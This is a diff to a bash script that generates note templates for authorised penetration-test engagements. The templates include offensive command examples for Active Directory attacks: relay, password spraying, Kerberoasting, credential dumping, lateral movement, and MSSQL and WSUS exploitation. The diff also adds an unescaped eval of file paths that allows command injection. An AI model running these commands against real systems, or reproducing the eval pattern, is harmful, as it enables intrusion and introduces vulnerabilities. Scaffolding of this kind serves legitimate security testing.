@@ -1,5 +1,25 @@
 # Optimized createdir function with reduced nesting
 
+# Helper function to validate IP addresses
+validate_ip() {
+    local ip=$1
+    local IFS='.'
+    local -a ip_parts=($ip)
+    
+    # Check if we have exactly 4 parts
+    [[ ${#ip_parts[@]} -eq 4 ]] || return 1
+    
+    # Check each part
+    for part in "${ip_parts[@]}"; do
+        # Check if it's a number
+        [[ "$part" =~ ^[0-9]+$ ]] || return 1
+        # Check if it's in valid range (0-255)
+        [[ $part -ge 0 && $part -le 255 ]] || return 1
+    done
+    
+    return 0
+}
+
 function createdir() {
     # Prompt for assessment type
     echo "Select the assessment type:"
@@ -159,12 +179,12 @@ _create_assessment_dirs() {
 # Helper function to create files based on assessment type
 _create_assessment_files() {
     local assessment_type=$1
-    local -n failed_files_ref=$2
+    local failed_var=$2
     
     case $assessment_type in
-        1) _create_external_files failed_files_ref ;;
-        2) _create_internal_files failed_files_ref ;;
-        3) _create_webapp_files failed_files_ref ;;
+        1) _create_external_files "$failed_var" ;;
+        2) _create_internal_files "$failed_var" ;;
+        3) _create_webapp_files "$failed_var" ;;
     esac
 }
 
@@ -200,7 +220,7 @@ _configure_direnv() {
 
 # Function to create external network assessment files
 _create_external_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     # Create 01-Admin files
     _create_file "01-Admin/1-Admin Information.md" "# Admin Information
@@ -219,7 +239,7 @@ _create_external_files() {
 ## Timeline
 - **Start Date:** 
 - **End Date:** 
-- **Report Due Date:** " failed_ref
+- **Report Due Date:** " "$failed_var"
 
     _create_file "01-Admin/2-Scope.md" "# Scope
 
@@ -236,7 +256,7 @@ _create_external_files() {
 ## Rules of Engagement
 - **Testing Hours:** 
 - **Emergency Contact:** 
-- **Notification Requirements:** " failed_ref
+- **Notification Requirements:** " "$failed_var"
 
     _create_file "01-Admin/3-Questions.md" "# Questions
 
@@ -255,7 +275,7 @@ _create_external_files() {
 ### Scope Clarifications
 - [ ] Are cloud services in scope?
 - [ ] Are third-party integrations included?
-- [ ] What about partner networks?" failed_ref
+- [ ] What about partner networks?" "$failed_var"
 
     _create_file "01-Admin/4-Clean-Up.md" "# Clean-Up
 
@@ -274,7 +294,7 @@ _create_external_files() {
 ### Evidence Collection
 - [ ] Screenshots collected
 - [ ] Logs exported
-- [ ] Scan results archived" failed_ref
+- [ ] Scan results archived" "$failed_var"
 
     _create_file "01-Admin/5-TODO.md" "# TODO
 
@@ -296,7 +316,7 @@ _create_external_files() {
 ### Post-Engagement
 - [ ] Clean up
 - [ ] Report writing
-- [ ] Client presentation" failed_ref
+- [ ] Client presentation" "$failed_var"
 
     # Create 02-Data files
     _create_file "02-Data/1-Users List.md" "# Users List
@@ -312,7 +332,7 @@ _create_external_files() {
 - [ ] Email harvesting
 - [ ] LinkedIn
 - [ ] Company website
-- [ ] Breach databases" failed_ref
+- [ ] Breach databases" "$failed_var"
 
     _create_file "02-Data/2-Listening Services.md" "# Listening Services
 
@@ -333,7 +353,7 @@ _create_external_files() {
 - 
 
 ### Other Services
-- " failed_ref
+- " "$failed_var"
 
     _create_file "02-Data/3-Count of Listening Service.md" "# Count of Listening Service
 
@@ -357,16 +377,16 @@ _create_external_files() {
 - **Info:** 0
 
 ### Total Unique Services: 0
-### Total Open Ports: 0" failed_ref
+### Total Open Ports: 0" "$failed_var"
 
     # Create OSINT files
-    _create_osint_files failed_ref
+    _create_osint_files "$failed_var"
     
     # Create Hostname Enumeration files
-    _create_hostname_enum_files failed_ref
+    _create_hostname_enum_files "$failed_var"
     
     # Create Scan files
-    _create_scan_files failed_ref
+    _create_scan_files "$failed_var"
     
     # Create placeholder files for other sections
     _create_file "03-Evidence/1-Notes/4-Services/README.md" "# Service Enumeration
@@ -375,7 +395,7 @@ _create_external_files() {
 - 
 
 ## Enumeration Results
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/5-Web App Testing/README.md" "# Web Application Testing
 
@@ -383,12 +403,12 @@ _create_external_files() {
 - 
 
 ## Testing Results
-- " failed_ref
+- " "$failed_var"
 }
 
 # Helper function to create OSINT files
 _create_osint_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     _create_file "03-Evidence/1-Notes/1-OSINT/1-Repo Searching.md" "# Repo Searching
 
@@ -404,7 +424,7 @@ _create_osint_files() {
 - [ ] API Keys
 - [ ] Passwords
 - [ ] Configuration files
-- [ ] Internal URLs" failed_ref
+- [ ] Internal URLs" "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-OSINT/2-Google Dorking.md" "# Google Dorking
 
@@ -422,7 +442,7 @@ _create_osint_files() {
 - [ ] Login pages
 - [ ] Directory listings
 - [ ] Error messages
-- [ ] Sensitive documents" failed_ref
+- [ ] Sensitive documents" "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-OSINT/3-Username Enumeration.md" "# Username Enumeration
 
@@ -439,7 +459,7 @@ _create_osint_files() {
 
 ### Email Format
 - Pattern: 
-- Confidence: " failed_ref
+- Confidence: " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-OSINT/4-Shodan.md" "# Shodan
 
@@ -458,7 +478,7 @@ _create_osint_files() {
 - [ ] Default credentials
 - [ ] Outdated versions
 - [ ] Exposed databases
-- [ ] Weak configurations" failed_ref
+- [ ] Weak configurations" "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-OSINT/5-Breach Searching.md" "# Breach Searching
 
@@ -477,7 +497,7 @@ _create_osint_files() {
 - 
 
 ### Password Patterns
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-OSINT/6-Exposed Buckets.md" "# Exposed Buckets
 
@@ -496,7 +516,7 @@ _create_osint_files() {
 - [ ] Publicly readable
 - [ ] Sensitive data
 - [ ] Backup files
-- [ ] Configuration files" failed_ref
+- [ ] Configuration files" "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-OSINT/7-Email Domain Security.md" "# Email Domain Security
 
@@ -521,12 +541,12 @@ _create_osint_files() {
 - [ ] Missing SPF
 - [ ] Weak DMARC policy
 - [ ] No DKIM
-- [ ] Spoofing possible" failed_ref
+- [ ] Spoofing possible" "$failed_var"
 }
 
 # Helper function to create hostname enumeration files
 _create_hostname_enum_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     _create_file "03-Evidence/1-Notes/2-Hostname Enumeration/1-Manual Searching.md" "# Manual Searching
 
@@ -542,7 +562,7 @@ _create_hostname_enum_files() {
 - 
 
 ### Tools Used
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/2-Hostname Enumeration/2-Apex Domains.md" "# Apex Domains
 
@@ -561,7 +581,7 @@ _create_hostname_enum_files() {
 - A records: 
 - CNAME records: 
 - MX records: 
-- TXT records: " failed_ref
+- TXT records: " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/2-Hostname Enumeration/3-Hunter.md" "# Hunter
 
@@ -580,7 +600,7 @@ _create_hostname_enum_files() {
 - 
 
 ### Additional Domains
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/2-Hostname Enumeration/4-Final Hostnames.md" "# Final Hostnames
 
@@ -600,12 +620,12 @@ _create_hostname_enum_files() {
 ### Next Steps
 - [ ] Port scanning
 - [ ] Service enumeration
-- [ ] Web application testing" failed_ref
+- [ ] Web application testing" "$failed_var"
 }
 
 # Helper function to create scan files
 _create_scan_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     _create_file "03-Evidence/1-Notes/3-Scans/1-Port Scans/1-Discovery.md" "# Discovery
 
@@ -628,7 +648,7 @@ _create_scan_files() {
 ### Results Summary
 - Total hosts discovered: 0
 - Response time: 
-- Filtered hosts: 0" failed_ref
+- Filtered hosts: 0" "$failed_var"
 
     _create_file "03-Evidence/1-Notes/3-Scans/1-Port Scans/2-TCP.md" "# TCP
 
@@ -651,7 +671,7 @@ _create_scan_files() {
 ### Next Steps
 - [ ] Service enumeration
 - [ ] Vulnerability scanning
-- [ ] Banner grabbing" failed_ref
+- [ ] Banner grabbing" "$failed_var"
 
     _create_file "03-Evidence/1-Notes/3-Scans/1-Port Scans/3-UDP.md" "# UDP
 
@@ -675,7 +695,7 @@ _create_scan_files() {
 - [ ] NTP (123)
 
 ### Security Implications
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/3-Scans/2-Vuln Scans/1-Nessus.md" "# Nessus
 
@@ -700,7 +720,7 @@ _create_scan_files() {
 - High: 0
 - Medium: 0
 - Low: 0
-- Info: 0" failed_ref
+- Info: 0" "$failed_var"
 
     _create_file "03-Evidence/1-Notes/3-Scans/2-Vuln Scans/2-Nuclei.md" "# Nuclei
 
@@ -721,7 +741,7 @@ _create_scan_files() {
 - 
 
 ### Verified Vulnerabilities
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/3-Scans/2-Vuln Scans/3-TLS.md" "# TLS
 
@@ -751,22 +771,23 @@ _create_scan_files() {
 - [ ] Heartbleed
 - [ ] POODLE
 - [ ] BEAST
-- [ ] FREAK" failed_ref
+- [ ] FREAK" "$failed_var"
 }
 
 # Helper function to safely create files
 _create_file() {
     local file_path=$1
     local content=$2
-    local -n failed_ref=$3
+    local failed_var=$3
     
     if ! echo -e "$content" > "$file_path"; then
-        failed_ref+=("$file_path")
+        # Use eval to append to the array variable passed by name
+        eval "${failed_var}+=('$file_path')"
     fi
 }
 # Function to create internal network assessment files
 _create_internal_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     # Create 01-Admin files
     _create_file "01-Admin/1-Admin Information.md" "# Admin Information
@@ -785,7 +806,7 @@ _create_internal_files() {
 ## Timeline
 - **Start Date:** 
 - **End Date:** 
-- **Report Due Date:** " failed_ref
+- **Report Due Date:** " "$failed_var"
 
     _create_file "01-Admin/2-Scope.md" "# Scope
 
@@ -805,7 +826,7 @@ _create_internal_files() {
 - **Testing Hours:** 
 - **Emergency Contact:** 
 - **Notification Requirements:** 
-- **Domain Admin Scope:** " failed_ref
+- **Domain Admin Scope:** " "$failed_var"
 
     _create_file "01-Admin/3-Questions.md" "# Questions
 
@@ -825,7 +846,7 @@ _create_internal_files() {
 ### Scope Clarifications
 - [ ] Are other domains in scope?
 - [ ] Can we test ADCS?
-- [ ] Is lateral movement allowed?" failed_ref
+- [ ] Is lateral movement allowed?" "$failed_var"
 
     _create_file "01-Admin/4-Clean-Up.md" "# Clean-Up
 
@@ -847,7 +868,7 @@ _create_internal_files() {
 - [ ] Screenshots collected
 - [ ] Logs exported
 - [ ] BloodHound data archived
-- [ ] Credential dumps secured" failed_ref
+- [ ] Credential dumps secured" "$failed_var"
 
     _create_file "01-Admin/5-TODO.md" "# TODO
 
@@ -870,7 +891,7 @@ _create_internal_files() {
 ### Post-Engagement
 - [ ] Clean up
 - [ ] Report writing
-- [ ] Client presentation" failed_ref
+- [ ] Client presentation" "$failed_var"
 
     _create_file "01-Admin/6-Detections.md" "# Detections
 
@@ -898,7 +919,7 @@ _create_internal_files() {
 ### Blue Team Coordination
 - **Notification sent:** 
 - **Testing authorized by:** 
-- **Real-time communication method:** " failed_ref
+- **Real-time communication method:** " "$failed_var"
 
     # Create 02-Data files
     _create_file "02-Data/1-Users List.md" "# Users List
@@ -923,7 +944,7 @@ _create_internal_files() {
 - [ ] LDAP enumeration
 - [ ] RID cycling
 - [ ] Kerberos user enumeration
-- [ ] SMB share analysis" failed_ref
+- [ ] SMB share analysis" "$failed_var"
 
     _create_file "02-Data/2-Listening Services.md" "# Listening Services
 
@@ -953,7 +974,7 @@ _create_internal_files() {
 ### Web Services
 - **IIS:** 
 - **Apache:** 
-- **Internal Web Apps:** " failed_ref
+- **Internal Web Apps:** " "$failed_var"
 
     _create_file "02-Data/3-Count of Listening Services.md" "# Count of Listening Services
 
@@ -979,7 +1000,7 @@ _create_internal_files() {
 
 ### Domain Controllers: 0
 ### Total Unique Services: 0
-### Total Open Ports: 0" failed_ref
+### Total Open Ports: 0" "$failed_var"
 
     _create_file "02-Data/4-Technology in Use.md" "# Technology in Use
 
@@ -1012,42 +1033,42 @@ _create_internal_files() {
 - **Email system:** 
 - **Database platforms:** 
 - **Web applications:** 
-- **Business applications:** " failed_ref
+- **Business applications:** " "$failed_var"
 
     # Create Unauthenticated files
-    _create_unauthenticated_files failed_ref
+    _create_unauthenticated_files "$failed_var"
     
     # Create SMB files
-    _create_smb_files failed_ref
+    _create_smb_files "$failed_var"
     
     # Create LDAP files
-    _create_ldap_files failed_ref
+    _create_ldap_files "$failed_var"
     
     # Create Poisoning files
-    _create_poisoning_files failed_ref
+    _create_poisoning_files "$failed_var"
     
     # Create User Compromise files
-    _create_user_compromise_files failed_ref
+    _create_user_compromise_files "$failed_var"
     
     # Create ADCS files
-    _create_adcs_files failed_ref
+    _create_adcs_files "$failed_var"
     
     # Create Machine Compromise files
-    _create_machine_compromise_files failed_ref
+    _create_machine_compromise_files "$failed_var"
     
     # Create MSSQL files
-    _create_mssql_files failed_ref
+    _create_mssql_files "$failed_var"
     
     # Create Internal Services files
-    _create_internal_services_files failed_ref
+    _create_internal_services_files "$failed_var"
     
     # Create Internal Web Services files
-    _create_internal_web_services_files failed_ref
+    _create_internal_web_services_files "$failed_var"
 }
 
 # Helper function to create unauthenticated files
 _create_unauthenticated_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     # Main unauthenticated files
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/1-Packet Capture.md" "# Packet Capture
@@ -1071,7 +1092,7 @@ _create_unauthenticated_files() {
 - 
 
 ### Credentials in Traffic
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/2-Responder Analyze.md" "# Responder Analyze
 
@@ -1090,7 +1111,7 @@ _create_unauthenticated_files() {
 ### Analysis Results
 - **Successful attacks:** 
 - **Failed attempts:** 
-- **Systems vulnerable:** " failed_ref
+- **Systems vulnerable:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/3-Email Domain Security.md" "# Email Domain Security
 
@@ -1112,7 +1133,7 @@ _create_unauthenticated_files() {
 - [ ] Missing SPF
 - [ ] Weak DMARC policy
 - [ ] No DKIM
-- [ ] Email spoofing possible" failed_ref
+- [ ] Email spoofing possible" "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/4-Find DCs.md" "# Find DCs
 
@@ -1137,7 +1158,7 @@ _create_unauthenticated_files() {
 ### DC Analysis
 - **OS versions:** 
 - **Patch levels:** 
-- **Exposed services:** " failed_ref
+- **Exposed services:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/5-Breached Credentials.md" "# Breached Credentials
 
@@ -1161,7 +1182,7 @@ _create_unauthenticated_files() {
 ### Credential Validation
 - **Valid credentials:** 
 - **Invalid credentials:** 
-- **Expired accounts:** " failed_ref
+- **Expired accounts:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/6-Host Discovery.md" "# Host Discovery
 
@@ -1190,7 +1211,7 @@ _create_unauthenticated_files() {
 - 
 
 ### Network Infrastructure
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/7-Initial NetExec.md" "# Initial NetExec
 
@@ -1213,7 +1234,7 @@ _create_unauthenticated_files() {
 ### Next Steps
 - [ ] Detailed SMB enumeration
 - [ ] LDAP enumeration
-- [ ] Service-specific testing" failed_ref
+- [ ] Service-specific testing" "$failed_var"
 
     # Unauthenticated SMB files
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/01-Unauth SMB/1-ZeroLogon.md" "# ZeroLogon
@@ -1234,7 +1255,7 @@ _create_unauthenticated_files() {
 
 ### Remediation
 - **Patches required:** 
-- **Enforcement mode:** " failed_ref
+- **Enforcement mode:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/01-Unauth SMB/2-PrintNightmare.md" "# PrintNightmare
 
@@ -1254,7 +1275,7 @@ _create_unauthenticated_files() {
 
 ### Impact
 - **System compromise:** 
-- **Domain escalation path:** " failed_ref
+- **Domain escalation path:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/01-Unauth SMB/3-SMBGhost.md" "# SMBGhost
 
@@ -1274,7 +1295,7 @@ _create_unauthenticated_files() {
 
 ### Remediation Status
 - **Patched systems:** 
-- **Unpatched systems:** " failed_ref
+- **Unpatched systems:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/01-Unauth SMB/4-Unauthenticated Coercion.md" "# Unauthenticated Coercion
 
@@ -1294,7 +1315,7 @@ _create_unauthenticated_files() {
 
 ### Impact
 - **NTLM relay potential:** 
-- **Certificate template abuse:** " failed_ref
+- **Certificate template abuse:** " "$failed_var"
 
     # Create placeholder README files for subdirectories
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/02-Unauth LDAP/README.md" "# Unauthenticated LDAP Enumeration
@@ -1303,7 +1324,7 @@ _create_unauthenticated_files() {
 - 
 
 ## Information Disclosed
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/1-Unauthenticated/03-Unauth Vulns/README.md" "# Unauthenticated Vulnerabilities
 
@@ -1311,12 +1332,12 @@ _create_unauthenticated_files() {
 - 
 
 ## Findings
-- " failed_ref
+- " "$failed_var"
 }
 
 # Helper function to create SMB files
 _create_smb_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     _create_file "03-Evidence/1-Notes/2-SMB/01-Manspider/README.md" "# ManSpider Results
 
@@ -1324,7 +1345,7 @@ _create_smb_files() {
 - 
 
 ## Sensitive Data
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/2-SMB/1-Unauthenticated Shares.md" "# Unauthenticated Shares
 
@@ -1339,7 +1360,7 @@ _create_smb_files() {
 - 
 
 ### Sensitive Information
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/2-SMB/2-Guest Access.md" "# Guest Access
 
@@ -1352,7 +1373,7 @@ _create_smb_files() {
 - 
 
 ### Information Disclosed
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/2-SMB/3-Spider Shares.md" "# Spider Shares
 
@@ -1368,7 +1389,7 @@ _create_smb_files() {
 - 
 
 ### Credentials in Files
-- " failed_ref
+- " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/2-SMB/4-SMB Vuln Scans.md" "# SMB Vuln Scans
 
@@ -1381,12 +1402,12 @@ _create_smb_files() {
 - 
 
 ### Remediation Recommendations
-- " failed_ref
+- " "$failed_var"
 }
 
 # Helper function to create LDAP enumeration files
 _create_ldap_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     _create_file "03-Evidence/1-Notes/3-LDAP/1-LDAP Enumeration.md" "# LDAP Enumeration
 
@@ -1418,7 +1439,7 @@ ldapsearch -x -h <target> -s sub -b 'DC=domain,DC=com' '(objectClass=user)'
 
 # Group enumeration
 ldapsearch -x -h <target> -s sub -b 'DC=domain,DC=com' '(objectClass=group)'
-\`\`\`" failed_ref
+\`\`\`" "$failed_var"
 
     _create_file "03-Evidence/1-Notes/3-LDAP/2-BloodHound.md" "# BloodHound
 
@@ -1444,7 +1465,7 @@ bloodhound-python -d domain.local -u username -p password -gc dc.domain.local -c
 - **Kerberoastable users:** 
 - **ASREPRoastable users:** 
 - **Unconstrained delegation:** 
-- **Constrained delegation:** " failed_ref
+- **Constrained delegation:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/3-LDAP/3-Domain Info.md" "# Domain Info
 
@@ -1468,12 +1489,12 @@ bloodhound-python -d domain.local -u username -p password -gc dc.domain.local -c
 
 ### Schema Information
 - **Schema Version:** 
-- **Custom Attributes:** " failed_ref
+- **Custom Attributes:** " "$failed_var"
 }
 
 # Helper function to create poisoning files
 _create_poisoning_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     _create_file "03-Evidence/1-Notes/4-Poisoning/1-Responder.md" "# Responder
 
@@ -1499,7 +1520,7 @@ responder -I eth0 -A
 ### Analysis
 - **Success rate:** 
 - **Systems responding:** 
-- **Vulnerable services:** " failed_ref
+- **Vulnerable services:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/4-Poisoning/2-Relay Attacks.md" "# Relay Attacks
 
@@ -1528,7 +1549,7 @@ ntlmrelayx.py -tf targets.txt -of hashes.txt
 ### Mitigation Bypass
 - **SMB Signing:** 
 - **EPA/Channel Binding:** 
-- **LDAP Signing:** " failed_ref
+- **LDAP Signing:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/4-Poisoning/3-IPv6 Attacks.md" "# IPv6 Attacks
 
@@ -1553,12 +1574,12 @@ ntlmrelayx.py -6 -t ldaps://dc.domain.local -wh attacker-wpad -l lootme
 
 ### DHCPv6 Spoofing
 - **Successful responses:** 
-- **DNS server set:** " failed_ref
+- **DNS server set:** " "$failed_var"
 }
 
 # Helper function to create user compromise files
 _create_user_compromise_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     _create_file "03-Evidence/1-Notes/5-User Compromise/1-Password Spraying.md" "# Password Spraying
 
@@ -1592,7 +1613,7 @@ kerbrute passwordspray --dc dc.domain.local -d domain.local users.txt 'Password1
 ### Lockout Monitoring
 - **Lockout threshold:** 
 - **Lockout duration:** 
-- **Current locked accounts:** " failed_ref
+- **Current locked accounts:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/5-User Compromise/2-ASREPRoasting.md" "# ASREPRoasting
 
@@ -1625,7 +1646,7 @@ john --wordlist=rockyou.txt asrep_hashes.txt
 ### Analysis
 - **Total ASREPRoastable:** 
 - **Successfully cracked:** 
-- **Weak passwords found:** " failed_ref
+- **Weak passwords found:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/5-User Compromise/3-Kerberoasting.md" "# Kerberoasting
 
@@ -1657,12 +1678,12 @@ Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt
 ### Service Analysis
 - **SQL Server accounts:** 
 - **Web service accounts:** 
-- **Custom services:** " failed_ref
+- **Custom services:** " "$failed_var"
 }
 
 # Helper function to create ADCS files
 _create_adcs_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     _create_file "03-Evidence/1-Notes/6-ADCS/1-Certificate Authority Info.md" "# Certificate Authority Info
 
@@ -1688,7 +1709,7 @@ _create_adcs_files() {
 - **ESC3:** 
 - **ESC4:** 
 - **ESC6:** 
-- **ESC8:** " failed_ref
+- **ESC8:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/6-ADCS/2-Certificate Attacks.md" "# Certificate Attacks
 
@@ -1718,7 +1739,7 @@ Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:certpass /
 ### Results
 - **Certificate obtained:** 
 - **Authentication successful:** 
-- **TGT retrieved:** " failed_ref
+- **TGT retrieved:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/6-ADCS/3-Web Enrollment.md" "# Web Enrollment
 
@@ -1740,12 +1761,12 @@ Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:certpass /
 ### Exploitation Results
 - **Certificates issued:** 
 - **Authentication bypass:** 
-- **Privilege escalation:** " failed_ref
+- **Privilege escalation:** " "$failed_var"
 }
 
 # Helper function to create machine compromise files  
 _create_machine_compromise_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     _create_file "03-Evidence/1-Notes/7-Machine Compromise/1-Host Enumeration.md" "# Host Enumeration
 
@@ -1769,7 +1790,7 @@ _create_machine_compromise_files() {
 - **IP Configuration:** 
 - **Network shares:** 
 - **Firewall status:** 
-- **AV/EDR detected:** " failed_ref
+- **AV/EDR detected:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/7-Machine Compromise/2-Privilege Escalation.md" "# Privilege Escalation
 
@@ -1806,7 +1827,7 @@ sc.exe config "ServiceName" binpath="C:\temp\shell.exe"
 ### Results
 - **Method used:** 
 - **SYSTEM access:** 
-- **Persistence installed:** " failed_ref
+- **Persistence installed:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/7-Machine Compromise/3-Credential Dumping.md" "# Credential Dumping
 
@@ -1844,7 +1865,7 @@ pypykatz lsa minidump lsass.dmp
 ### DPAPI Secrets
 - **Master keys:** 
 - **Browser passwords:** 
-- **WiFi passwords:** " failed_ref
+- **WiFi passwords:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/7-Machine Compromise/4-Lateral Movement.md" "# Lateral Movement
 
@@ -1884,12 +1905,12 @@ wmiexec.py -hashes :ntlmhash domain/user@target
 ### Network Discovery
 - **Subnets found:** 
 - **Additional targets:** 
-- **Network segmentation:** " failed_ref
+- **Network segmentation:** " "$failed_var"
 }
 
 # Helper function to create MSSQL files
 _create_mssql_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     _create_file "03-Evidence/1-Notes/8-MSSQL/1-Instance Discovery.md" "# Instance Discovery
 
@@ -1921,7 +1942,7 @@ sqlcmd -S server\instance -Q "SELECT @@VERSION"
 - **Default instance:** 
 - **Named instances:** 
 - **SQL Browser:** 
-- **Remote connections:** " failed_ref
+- **Remote connections:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/8-MSSQL/2-Authentication.md" "# Authentication
 
@@ -1956,7 +1977,7 @@ nmap --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt target
 ### Privilege Assessment
 - **sysadmin role:** 
 - **db_owner roles:** 
-- **Custom roles:** " failed_ref
+- **Custom roles:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/8-MSSQL/3-Privilege Escalation.md" "# Privilege Escalation
 
@@ -1999,7 +2020,7 @@ CREATE ASSEMBLY pwn FROM 0x4D5A9000...
 ### Results
 - **Escalation successful:** 
 - **Commands executed:** 
-- **System access:** " failed_ref
+- **System access:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/8-MSSQL/4-Linked Servers.md" "# Linked Servers
 
@@ -2034,12 +2055,12 @@ SELECT * FROM OPENQUERY("LinkedServer", 'SELECT * FROM OPENROWSET(''SQLOLEDB'', 
 ### Results
 - **Servers accessed:** 
 - **Privilege escalation:** 
-- **Data accessed:** " failed_ref
+- **Data accessed:** " "$failed_var"
 }
 
 # Helper function to create internal services files
 _create_internal_services_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     _create_file "03-Evidence/1-Notes/9-Internal Services/1-Service Overview.md" "# Service Overview
 
@@ -2065,7 +2086,7 @@ _create_internal_services_files() {
 - **DHCP:** 
 - **DNS:** 
 - **WSUS:** 
-- **ADFS:** " failed_ref
+- **ADFS:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/9-Internal Services/2-File Shares.md" "# File Shares
 
@@ -2100,7 +2121,7 @@ smbmap -H target -u username -p password
 ### Data Extraction
 - **Files downloaded:** 
 - **Credentials found:** 
-- **Sensitive information:** " failed_ref
+- **Sensitive information:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/9-Internal Services/3-Print Servers.md" "# Print Servers
 
@@ -2134,7 +2155,7 @@ python3 dementor.py -u username -p password -d domain.local target listener
 ### Results
 - **Vulnerable servers:** 
 - **Exploitation successful:** 
-- **Privilege escalation:** " failed_ref
+- **Privilege escalation:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/9-Internal Services/4-WSUS.md" "# WSUS
 
@@ -2161,12 +2182,12 @@ python3 wsuxploit.py -t target -c "cmd.exe /c calc.exe"
 ### Attack Results
 - **Vulnerable clients:** 
 - **Updates injected:** 
-- **Code execution:** " failed_ref
+- **Code execution:** " "$failed_var"
 }
 
 # Helper function to create internal web services files
 _create_internal_web_services_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     _create_file "03-Evidence/1-Notes/10-Internal Web Services/1-Web Applications.md" "# Web Applications
 
@@ -2193,7 +2214,7 @@ _create_internal_web_services_files() {
 - **Admin panels:** 
 - **API endpoints:** 
 - **File uploads:** 
-- **Debug pages:** " failed_ref
+- **Debug pages:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/10-Internal Web Services/2-Exchange.md" "# Exchange
 
@@ -2227,7 +2248,7 @@ python3 exchangerecon.py -t exchange.domain.local
 ### Results
 - **Vulnerability found:** 
 - **Exploitation successful:** 
-- **Data accessed:** " failed_ref
+- **Data accessed:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/10-Internal Web Services/3-SharePoint.md" "# SharePoint
 
@@ -2261,7 +2282,7 @@ gobuster dir -u https://sharepoint.domain.local -w /usr/share/wordlists/seclists
 - **Document libraries:** 
 - **User information:** 
 - **Configuration data:** 
-- **Credentials found:** " failed_ref
+- **Credentials found:** " "$failed_var"
 
     _create_file "03-Evidence/1-Notes/10-Internal Web Services/4-Jenkins.md" "# Jenkins
 
@@ -2298,12 +2319,12 @@ println proc.text
 - **Stored passwords:** 
 - **API keys:** 
 - **SSH keys:** 
-- **Cloud credentials:** " failed_ref
+- **Cloud credentials:** " "$failed_var"
 }
 
 # Function to create webapp assessment files
 _create_webapp_files() {
-    local -n failed_ref=$1
+    local failed_var=$1
     
     # Create 01-Admin files
     _create_file "01-Admin/1-Admin Information.md" "# Admin Information
@@ -2328,7 +2349,7 @@ _create_webapp_files() {
 ## Timeline
 - **Start Date:** 
 - **End Date:** 
-- **Report Due Date:** " failed_ref
+- **Report Due Date:** " "$failed_var"
 
     _create_file "01-Admin/2-Scope.md" "# Scope
 
@@ -2350,7 +2371,7 @@ _create_webapp_files() {
 - **Account Lockouts:** 
 - **Data Modification:** Prohibited
 - **File Upload:** Test files only
-- **Denial of Service:** Not permitted" failed_ref
+- **Denial of Service:** Not permitted" "$failed_var"
 
     _create_file "01-Admin/3-Questions.md" "# Questions
